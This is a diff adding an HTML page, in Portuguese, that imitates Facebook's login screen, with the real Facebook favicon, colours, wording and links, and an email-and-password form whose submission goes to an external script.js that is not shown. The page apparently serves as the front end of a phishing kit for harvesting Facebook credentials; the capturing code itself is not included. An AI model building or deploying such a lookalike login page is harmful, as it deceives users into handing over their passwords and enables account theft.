@@ -1,0 +1,47 @@
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - entre ou cadastre-se</title>
+    <link rel="icon" href="https://www.facebook.com/images/fb_icon_325x325.png" type="image/png">
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-50 flex items-center justify-center min-h-screen" style="background-color: #f2f4f7;">
+    <div class="flex flex-col md:flex-row items-center justify-center w-full max-w-4xl p-4">
+        <div class="text-center md:text-left md:w-1/2 mb-8 md:mb-0">
+            <h1 class="text-blue-600 text-5xl font-bold">facebook</h1>
+            <p class="text-xl mt-4">O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</p>
+        </div>
+        <div class="flex flex-col items-center md:w-1/2">
+            <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-sm">
+                <form id="loginForm">
+                    <div class="mb-4">
+                        <input id="emailOrPhone" type="text" placeholder="Email ou telefone" class="w-full p-3 border border-gray-300 rounded-lg">
+                    </div>
+                    <div class="mb-4">
+                        <input id="password" type="password" placeholder="Senha" class="w-full p-3 border border-gray-300 rounded-lg">
+                    </div>
+                    <div class="mb-4">
+                        <button type="submit" class="w-full text-white p-3 rounded-lg font-bold" style="background-color: #0866ff;">Entrar</button>
+                    </div>
+                    <div class="text-center mb-4">
+                        <a href="https://www.facebook.com/login/identify/?ctx=recover" class="text-blue-600">Esqueceu a senha?</a>
+                    </div>
+                    <hr class="my-4">
+                    <div class="text-center">
+                        <a href="https://www.facebook.com/r.php?entry_point=login">
+                            <button type="button" class="bg-green-600 text-white p-3 rounded-lg font-bold" style="background-color: #42b72a;">Criar nova conta</button>
+                        </a>
+                    </div>
+                </form>
+            </div>
+            <div class="text-center mt-4">
+                <p class="text-sm">Crie uma <a href="https://www.facebook.com/pages/create/?ref_type=registration_form" class="text-blue-600">Página</a> para uma celebridade, uma marca ou uma empresa.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Referência ao arquivo JavaScript externo -->
+    <script src="script.js"></script>
+</body>
+</html>
